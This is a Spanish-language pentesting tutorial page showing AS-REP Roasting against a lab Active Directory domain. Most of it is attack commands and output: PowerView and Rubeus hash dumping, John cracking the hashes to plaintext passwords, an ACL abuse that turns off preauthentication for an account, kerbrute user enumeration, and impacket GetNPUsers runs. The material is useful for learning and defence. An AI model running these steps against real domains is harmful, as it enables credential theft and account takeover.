---
icon: repeat
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# AS-REP Roasting

Lo que vamos hacer con esta tecnica es parecida que la del `AS-REQ Roasting` pero en vez de capturar el paquete que se le envia al `AS` capturaremos la `Respuesta` del `AS` con el paquete que envia al usuario cifrado con la `clave privada` del usuario que dentro contiene la `clave de sesion` del servicio a consumir.

Pero la diferencia del otro es que en este caso en vez de estar `sniffeando` la red, lo que vamos hacer es enviarle el nombre de usuario al `AS` como atacante y este va a coger ese nombre de usuario va a buscar la `clave privada` que corresponde a ese usuario, para cifrar el paquete con la `clave de sesion` y nos lo enviara a nosotros, con ese paquete que nos envie de forma `offline` vamos a tratar de `crackear` esa `clave privada` para poderla obtener en texto plano.

Pero con la medida de seguridad de `Preautenticacion` no se puede hacer esto, solo que hay algunos usuarios que esto no lo tienen activado esta medida de seguridad y con ellos si lo podremos hacer, para poder enumerar esto cargaremos en el equipo del `empleado1` el script de `PowerView`.

```powershell
cd .\Desktop
. .\new_powerview.ps1
Get-DomainUser -PreauthNotRequired
```

Info:

```
logoncount            : 0
badpasswordtime       : 01/01/1601 1:00:00
distinguishedname     : CN=Audre Maible,CN=Users,DC=corp,DC=local
objectclass           : {top, person, organizationalPerson, user}
userprincipalname     : Audre.Maible@corp.local
name                  : Audre Maible
objectsid             : S-1-5-21-3352250647-938130414-2449934813-1126
samaccountname        : audre.maible
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 11/01/2025 15:10:02
instancetype          : 4
usncreated            : 49344
objectguid            : b5f49280-31af-44be-bc38-e2b6a60bbf3f
sn                    : Maible
lastlogoff            : 01/01/1601 1:00:00
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=local
dscorepropagationdata : {12/01/2025 16:31:12, 01/01/1601 0:00:01}
givenname             : Audre
lastlogon             : 01/01/1601 1:00:00
badpwdcount           : 0
cn                    : Audre Maible
useraccountcontrol    : NORMAL_ACCOUNT, DONT_REQ_PREAUTH
whencreated           : 11/01/2025 15:09:55
primarygroupid        : 513
pwdlastset            : 11/01/2025 16:10:02
usnchanged            : 50018

logoncount            : 0
badpasswordtime       : 01/01/1601 1:00:00
distinguishedname     : CN=Gerri Kathi,CN=Users,DC=corp,DC=local
objectclass           : {top, person, organizationalPerson, user}
userprincipalname     : Gerri.Kathi@corp.local
name                  : Gerri Kathi
objectsid             : S-1-5-21-3352250647-938130414-2449934813-1133
samaccountname        : gerri.kathi
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 11/01/2025 15:10:02
instancetype          : 4
usncreated            : 49386
objectguid            : 54c46c80-fc16-4f6c-ad7a-1c23b36358df
sn                    : Kathi
lastlogoff            : 01/01/1601 1:00:00
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=local
dscorepropagationdata : {12/01/2025 16:31:12, 01/01/1601 0:00:01}
givenname             : Gerri
lastlogon             : 01/01/1601 1:00:00
badpwdcount           : 0
cn                    : Gerri Kathi
useraccountcontrol    : NORMAL_ACCOUNT, DONT_REQ_PREAUTH
whencreated           : 11/01/2025 15:09:55
primarygroupid        : 513
pwdlastset            : 11/01/2025 16:10:02
usnchanged            : 50024

logoncount            : 0
badpasswordtime       : 01/01/1601 1:00:00
distinguishedname     : CN=Marsha Jordan,CN=Users,DC=corp,DC=local
objectclass           : {top, person, organizationalPerson, user}
userprincipalname     : Marsha.Jordan@corp.local
name                  : Marsha Jordan
objectsid             : S-1-5-21-3352250647-938130414-2449934813-1147
samaccountname        : marsha.jordan
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 11/01/2025 15:10:02
instancetype          : 4
usncreated            : 49470
objectguid            : de916f39-c503-4ece-a766-95e800272893
sn                    : Jordan
lastlogoff            : 01/01/1601 1:00:00
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=local
dscorepropagationdata : {12/01/2025 16:31:12, 01/01/1601 0:00:01}
givenname             : Marsha
lastlogon             : 01/01/1601 1:00:00
badpwdcount           : 0
cn                    : Marsha Jordan
useraccountcontrol    : NORMAL_ACCOUNT, DONT_REQ_PREAUTH
whencreated           : 11/01/2025 15:09:56
primarygroupid        : 513
pwdlastset            : 11/01/2025 16:10:02
usnchanged            : 50021
```

Esto nos va a mostrara los usuarios que no tienen esta medida de seguridad, en concreto esta flag de aqui donde la seccion de `useraccountcontrol` que pone `DONT_REQ_PREAUTH` por lo que cuando enviemos ese usuario no va a pedir una `Preautenticacion`.

Para ver esta flag dentro del `DC` si nos vamos donde los usuarios y seleccionamos uno cualquiera, veremos esta seccion de aqui:

<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

Donde pone `Do not require Kerberos preauthentication` significa que si eso esta marcado no va a pedir la autenticacion previa que vemos que hace el `AS`.

El script que ejecutamos muy anteriormente ya nos montaba este tipo de vulnerabilidades con el `kerberos` pero si no fuera asi, marcamos esa casilla y ya seria vulnerable.

Vamos a ver en mi caso que usuario tiene esa vulnerabilidad, en mi caso me saco 3 usuarios:

```
distinguishedname     : CN=Audre Maible,CN=Users,DC=corp,DC=local
distinguishedname     : CN=Gerri Kathi,CN=Users,DC=corp,DC=local
distinguishedname     : CN=Marsha Jordan,CN=Users,DC=corp,DC=local
```

### Rubeus.exe para AS-REP Roasting

Podremos elegir cualquiera de los 3, en mi caso elegire `audre.maible` y utilizaremos la herramienta `Rubeus` para poder realizar esta tecnica.

```powershell
cd C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug
.\Rubeus.exe asreproast /format:john /outfile:hash.john 
```

Info:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.local

[*] Searching path 'LDAP://DC01.corp.local/DC=corp,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : audre.maible
[*] DistinguishedName      : CN=Audre Maible,CN=Users,DC=corp,DC=local
[*] Using domain controller: DC01.corp.local (192.168.5.5)
[*] Building AS-REQ (w/o preauth) for: 'corp.local\audre.maible'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug\hash.john

[*] SamAccountName         : gerri.kathi
[*] DistinguishedName      : CN=Gerri Kathi,CN=Users,DC=corp,DC=local
[*] Using domain controller: DC01.corp.local (192.168.5.5)
[*] Building AS-REQ (w/o preauth) for: 'corp.local\gerri.kathi'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug\hash.john

[*] SamAccountName         : marsha.jordan
[*] DistinguishedName      : CN=Marsha Jordan,CN=Users,DC=corp,DC=local
[*] Using domain controller: DC01.corp.local (192.168.5.5)
[*] Building AS-REQ (w/o preauth) for: 'corp.local\marsha.jordan'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug\hash.john

[*] Roasted hashes written to : C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug\hash.john
```

Vemos que nos ha volcado los `hashes` de los 3 usuarios que tienen esta vulnerabilidad, pero nos quedaremos con el usuario que dijimos anteriormente, este fichero se habra volcado en el siguiente direccion:

```
C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug\hash.john
```

Si abrimos el archivo con un bloc de notas, veremos los 3 `hashes`:

<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

En formato de `john`.

La herramienta basicamente lo que hace es de forma automatica consulta en el `LDAP` los usuarios que tengan ese `kerberos` marcado de que no les hace falta esa `preautenticacion` y te realizar la tecnica.

Ahora lo que vamos hacer es pasarnos ese `hash` del primer usuario a `kali` en el siguiente archivo:

> asrep.hash

```
$krb5asrep$audre.maible@corp.local:C1150490A3362A16E45BDD6105D3E094$5B9902EFF73ADDC8D63B780B18C471892A9978C6ACBC0EBF70D2AA9EF371F9D2D1FBDA055ADE5A2F5A366007E8B358F41493BBE4D40758ECBAA7F9D4C3B3ECBD203B6D1D5C6510701135A95197B305736E137C77AFFD3AD56EA4762BCFABB4D39234B109646E12E67790A46A591BE319A6B306E7DDFFEBAA7BB63D9D35F2AD34BD8D5BF6D6D729FB70CD99D2451B10CF76098FEDD0EF9CC84A01D90F36E64E3D64596F47AFD7F9AEDFDB51D25C2BE496647E53EF2DEB8FE71FFECA4407201F3D763C516722E37D10292FAD0BFFEC9DDBB07CC4AA79DDA52102ED839CD055DB0A9A9A0444DD3CD299
```

Y con `john` podremos hacer lo siguiente:

```shell
john asrep.hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
password1        ($krb5asrep$audre.maible@corp.local)     
1g 0:00:00:00 DONE 2/3 (2025-01-15 05:12) 11.11g/s 560044p/s 560044c/s 560044C/s 123456..crawford
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Y por lo que vemos nos saca la contraseña de dicho usuario que en este caso seria `password1`.

Si por ejemplo probamos el del otro usuario segundo, veremos algo asi:

> asrep1.hash

```
$krb5asrep$gerri.kathi@corp.local:553292BD29ADBC29F20352A2F934C4DD$03E101A3282038EE3E6BDD274D705B81A2A7DE154465A6C78C0A0F4560B5CEAC23F7AC0B4AAF6AE0E4CA8CE6DB2062D9D40DEAC62D4D1FFC514EB99761B296B68931AFD0029A2333A0CF67895468D572C053FF2C104FAD2610DDDB7B36D34FEF954CEFEFEF6D0F94BB30C6A8BFDBC03DB4EECADBA4E8811CBD39D6E1E9B519F5D88AA76CDCF54112EE13F6C4F722D2801E0DB0D543E6D12B995F5810D81F04FA28767D8EA5D3E4DEBC414AED89B6E1BBB94667393248DC44DC8B1153D78D28379637E368F1061AA95CBC7991A4588CDC04EC8D5CD86A8B70BC4262509980075272BF0518F8E5C9FC
```

```shell
john asrep1.hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
marina           ($krb5asrep$gerri.kathi@corp.local)     
1g 0:00:00:00 DONE 2/3 (2025-01-15 05:13) 12.50g/s 624325p/s 624325c/s 624325C/s 123456..crawford
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que para el segundo usuario seria `marina` y asi sucesivamente.

### Vulnerabilidad de ACL (WriteAll)

Si en algun casual ningun usuario tuviera esta flag marcada de `kerberos` sin la `preautenticacion` podremos ver las `ACLs` para ver si algun usuario tiene alguna mala configuracion la cual podamos aprovechar para poder activar esto desde terminal, pongamos que un usuario tiene una `ACL` sobre el `empleado1` en el que este mismo tiene un `WriteAll` sobre dicho usuario, podremos hacer lo siguiente desde terminal del `empleado1`.

Pero antes lo configuraremos de esa forma, nos iremos a `DC` -> `Administrador del servidor` -> `Usuarios y equipos del dominio de Active Directory` -> `Users` -> elegimos uno que no tenga marcado esa casilla de `Kerberos` en mi caso sera `meg.carolee` -> `Seguridad` -> `Opciones Avanzadas` -> `Agreagar` -> `Seleccion principal` -> seleccionamos al usuario `empelado1` -> borramos todas las opciones y le damos a la casilla de arriba del todo que pone `Escribir todas las propiedades` -> `Aceptar` -> `Aplicar` -> `Aceptar`.

Echo esto ya podremos hacer lo que comentaba anteriormente, por lo que con el script de `PowerView` cargado haremos lo siguiente para marcar esa casilla sobre dicho usuario, ya que tenemos una `ACL` que nos permite escribir lo que queramos sobre ese usuario.

```powershell
Set-DomainObject -Identity meg.carolee -XOR @{useraccountcontrol=4194304} -Verbose
```

Lo que estamos haciendo aqui es que establezca este valor `4194304` a dicho usuario que ese valor corresponde a cuando la preautenticacion de `kerberos` esta desactivada (La casilla marcada), por lo que con esto hacemos que esa casilla este marcada.

Info:

```
DETALLADO: [Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=CORP,DC=LOCAL
DETALLADO: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=meg.carolee)(name=meg.carolee)(dnshostname=meg.carolee))))
DETALLADO: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'meg.carolee'
```

Si nos vamos a nuestro `DC` veremos que el usuario ahora lo tiene marcado:

<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

Y si lanzamos el script de `Rubeus` veremos que ahora nos saca ese usuario tambien:

```powershell
.\Rubeus.exe asreproast
```

Info:

```

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.local

[*] Searching path 'LDAP://DC01.corp.local/DC=corp,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : meg.carolee
[*] DistinguishedName      : CN=Meg Carolee,CN=Users,DC=corp,DC=local
[*] Using domain controller: DC01.corp.local (192.168.5.5)
[*] Building AS-REQ (w/o preauth) for: 'corp.local\meg.carolee'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$meg.carolee@corp.local:BEB016376D48D2E712231F30CFDED557$0ABE7227CCADC
      46D13072A5C8C53D6B808E88B92F8B7775E4D611C29558CCE957558725EDA57399BD2DDED593C40F
      1C965707484A6B91352AB64855EF46E2DB7FDF46A1C5BD2A21FB8D52EADD782A7A96D5D63D7B6FC0
      01B75BE1776A67B6F84C15570F36AD57F39ACFC8C382276A58605152B72AE7D044EFDCAE9B2F964C
      CD1C51E293D7FF6EFF6354DFEBFECEC118071164F431496A0091075E9173751223207E97542C189F
      9D844F1D755EC325F36C2691D333D8882170BF949D94CFED453CA31A6E671268C53605BF641ECA0E
      FE230C6A32FB70A90737FE5808F126904E4C33D1275FB95746B
```

Por lo que todo esta correcto.

### Replicación de AS-REP Roasting en Linux

Ahora vamos a ver como realizar todo esto pero en `Linux` con nuestro `kali`, por que en muchas ocasiones no vamos a tener un usuario de dominio.

Vamos a utilizar `kerbrute` pero antes abriremos `Wireshark` para capturar el trafico de red que va a generar `kerbrute` para interceptar ese paquete que nos interesa.

Una vez abierto `Wireshark`, escuchando en la interfaz de red correspondiente y poniendo el filtro de `kerberos` haremos lo siguiente con `kerbrute`:

Antes en la lista de usuarios pongamos que hemos conseguido enumerar gran parte de usuarios, entre ellos los que tienen el `kerberos` de la `preautenticacion` deshabilitado en la casilla habilitado.

> users.txt

```
empleado1
empleado2
angelika.shelly
audre.maible
maurine.bibby
pearl.judye 
peta.adelind
```

En la herramienta:

```shell
kerbrute userenum -d corp.local --dc 192.168.5.5 users.txt
```

Info:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/15/25 - Ronnie Flathers @ropnop

2025/01/15 05:41:59 >  Using KDC(s):
2025/01/15 05:41:59 >   192.168.5.5:88

2025/01/15 05:41:59 >  [+] VALID USERNAME:       angelika.shelly@corp.local
2025/01/15 05:41:59 >  [+] VALID USERNAME:       empleado2@corp.local
2025/01/15 05:41:59 >  [+] VALID USERNAME:       empleado1@corp.local
2025/01/15 05:41:59 >  [+] VALID USERNAME:       audre.maible@corp.local
2025/01/15 05:41:59 >  [+] VALID USERNAME:       maurine.bibby@corp.local
2025/01/15 05:41:59 >  [+] VALID USERNAME:       pearl.judye@corp.local
2025/01/15 05:41:59 >  [+] VALID USERNAME:       peta.adelind@corp.local
2025/01/15 05:41:59 >  Done! Tested 7 usernames (7 valid) in 0.008 seconds
```

Si nos vamos a `Wireshark` vamos a ver lo siguiente:

<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

Vemos que hemos interceptado todos los paquetes de las solicitudes que ha echo `kerbrute` las cuales tendremos que ver cuales no piden la `Preautenticacion` de `kerberos` sobre que usuario y esto lo veremos siguiendo las trazas de paquetes de datos:

Si nos vamos a esta parte de aqui:

<figure><img src="../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

Estamos viendo que la traza lleva directamente a un `AS-REP` por lo que no esta pidiendo una `Preautenticacion` de `kerberos` por lo que vamos a ver los datos de ese paquete, para saber el nombre de usuario.

<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

Vemos que se llama `audre.maible` por lo que vamos a irnos al `AS-REP` y copiamos el valor de `cipher`.

<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

Una vez copiado dicho valor, veremos algo asi:

```
e6d791e65267fa70f4c614030b6dc81b3449e6e7ee468da7aa80e6c0fef3dfdf35aa2bc93d4a5c7582d993ebcf4cb86330358f93e20fed47b7dde92eb158806555a138337a9a9f48d49316d2c33e017e2fdb3731d0a16bfc6f42823728a7705db07dfd7a7b1f40edf1e544359151e6f064d36e4f225dd673bda31008c180351ca70e983f8f4f84b3e3ce78b762ba7bbe50577f7eeefebeb4c1095d5970df8d6a92e7c041ab513fc09564736cfef5a632e47e4779169dc0cec6ecad4c20d87e392c51c3d7d7f324ce098988ffef769e7f90fc25fe84515b32605e2fdd05be5f34cbc772d4c4dc3550be749c405b90c1c4cc14a7ba2c20631ac3b0a2f57b99e4758af0e992e567002c56c6cca3
```

Esto lo tendremos que pasar al formato correspondiente como vimos anteriormente, lo pasamos por `john` y ya lo tendriamos `crackeado`, pero si lo queremos hacer con una herramienta en `kali` se puede utilizar `impacket`.

```shell
impacket-GetNPUsers corp.local/ -users users.txt -format john -outputfile asrep2.hash
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User empleado1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User empleado2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angelika.shelly doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$audre.maible@CORP.LOCAL:30da558531771a74867f1a07221ffff7$68319ffa58a80bb4e4f8ceaaf741019ee08e6ef75a88e78cf3581fd15d96e81e1780941da573cda6159411cb4efa4dcc7bc32e2ee5344b4391a55ab0df55d43030ae6678c4f1445bff775534ac957dce84a82094b0b85bfddb9f29ba98a60f1b29fcb0cb7263b20d5c3a719192c9f669b2ad6efa0a16ece5e106374a50d32ab86871cd8b635d9c7749ab2b3abc02b14958c1180b55d8dfd403f3bd25ef51ef8e18e62f244217be0531995ad168f3aa0b458aa56a9aed11beaa04a55b64d6a9d89f963247c2f17d49fec1ccece3a28edd1b26b40e02748a92d1836347177a3365efb29665b24bec66
[-] User maurine.bibby doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User pearl.judye doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User peta.adelind doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Vemos que lo ha conseguido con un usuario y si leemos el archivo que nos volco, veremos que lo guuardo ahi:

```shell
cat asrep2.hash
```

Info:

```
$krb5asrep$audre.maible@CORP.LOCAL:30da558531771a74867f1a07221ffff7$68319ffa58a80bb4e4f8ceaaf741019ee08e6ef75a88e78cf3581fd15d96e81e1780941da573cda6159411cb4efa4dcc7bc32e2ee5344b4391a55ab0df55d43030ae6678c4f1445bff775534ac957dce84a82094b0b85bfddb9f29ba98a60f1b29fcb0cb7263b20d5c3a719192c9f669b2ad6efa0a16ece5e106374a50d32ab86871cd8b635d9c7749ab2b3abc02b14958c1180b55d8dfd403f3bd25ef51ef8e18e62f244217be0531995ad168f3aa0b458aa56a9aed11beaa04a55b64d6a9d89f963247c2f17d49fec1ccece3a28edd1b26b40e02748a92d1836347177a3365efb29665b24bec66
```

Y ya seria tan sencillo como `crackearlo` con `jonh`.

Pero si por ejemplo tenemos las credenciales de un usuario de dominio, podremos lanzar la herramienta de la siguiente forma:

```shell
impacket-GetNPUsers corp.local/empleado1:Passw0rd2 -format john -outputfile asrep3.hash
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Name           MemberOf  PasswordLastSet             LastLogon                   UAC      
-------------  --------  --------------------------  --------------------------  --------
audre.maible             2025-01-15 04:58:34.944877  2025-01-15 05:53:12.898279  0x400200 
gerri.kathi              2025-01-11 10:10:02.117869  2025-01-15 05:28:43.303210  0x400200 
marsha.jordan            2025-01-11 10:10:02.071007  2025-01-15 05:28:43.334491  0x400200 
meg.carolee              2025-01-11 10:09:58.227268  2025-01-15 05:28:43.396455  0x400200 



/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$audre.maible@CORP.LOCAL:f49234e31b413968ffd55f21480de8e0$fc93be83567283402fcf78b5876fbd58bce9c4fe9fe2f5c0f88de1fa722fefb5cf06d8ce0436fb74e8723cabc8b228e3ffc0acc8ed5f57d2dad0b55994b68e812b9c4b776e657a2d4946ec06289c78e3341fbf09691c8c6111622be658612dfa31d26e8533179d8f88d27e321c3e574f96fe9c200643f7817a4629df94ec83131c70f5a0c9e512951d1a21818e35689cb69d5da7e16be8645802a31ac88d2626e3757b3e6a2bd082d85c2a3603688a7092067245ec0e636119c3cb128cd3e1d58f4a61f1b6e6cdeed97e930d156d082f490c0e39b59292cd8caa643ca14ec206a168bca184dfcfbf
$krb5asrep$gerri.kathi@CORP.LOCAL:333b0ecdaa1647449bb76db778313ff0$589a12604af38ace9f2b5468b295be1cead1cbfc23be2e3acb06065631201947a54474063e4a8ce722cd22a978f6512cdd2f25906f278480da0c243b539d1bed7a373b42742a8a4b7684c0229fe70d2e286eb51ac1a81b3fa91e34bc761e47b3710175f19d20724b9344d990e9582a797576c45fc1cb1421d3e07305d9a334f36fec09897a34b5618e5bf832051042f868653ac30d0b746f4936b508a966afeb4c53109dc6cc63639d95f8293922d4019cf8ae604c1907e6dab61a5e39b68addf5f04c3cec20db4a9ffecb0361cfeb45e527cd99e550bfce47e431db74406faffbbb543c57fc5a42
$krb5asrep$marsha.jordan@CORP.LOCAL:b44d3f1b385c9aba78b526486d99a81e$99972143890d477bac467cf15169a632c9a98a9ca015814b2edaf22f8a312d600451fa4827964430e5e9f98369cd666636d6c1bebbd3508fd66f05225f03c0e6a95325ea77ba420faa017023ca5690d71f4d976d97f0fcd9bb7a27e2c3d35f8112325faeb50aa2372606d89d0c622287386dbd20d3f168f1b984a70db618e6a9845985045b8a0a9fdf649e1cb2b3acc87f93c73201566b01be13795a587f36791d5d073f17efd92dbdbf8f96ed1d769251bb1213df19e7d4c9e6f08801577201771ccefa862906f9bb2577380205c2a6ed5dd01567789298e2b7b48866565346d89e2ec860475597
$krb5asrep$meg.carolee@CORP.LOCAL:8f1f93ca03f2de5d73470f6487e49ad2$6e0f3b04440adb5f6f8f42a31990f87ec9c4b3d5a471b9d8503f27c7b2c0f6b6e1c8b32e0fd8e675af1400a8630f3bf48b2be505a845cd08bdf10e6d73b2d9aa57dee1331b8fa42241b405d58c5b8782622e6ca38acf411ef5416fd25b06860035d625b4b702da4d7a6c5aca854cfbfcfb91eea45e57737ad6fee6f3d177e81a891d35dff663bbdfd350e00efaa975d2e660183163f4fd68c49460fcaea523304dfb7aa6f5259a855dec5757fc4f34312c4e3afb3024079e18412f7787ca79d6612fdd10f3d8eea37b071a0d9b28efc451e891ddd1f3a3cb12a20b27582ee653615003c7022eb308
```

Por lo que vemos encontro a 4 usuarios que tienen esa vulnerabilidad de todos los usuarios que hay en el dominio.

Y ya seria el mismo proceso para `crackearla` con `jonh`.
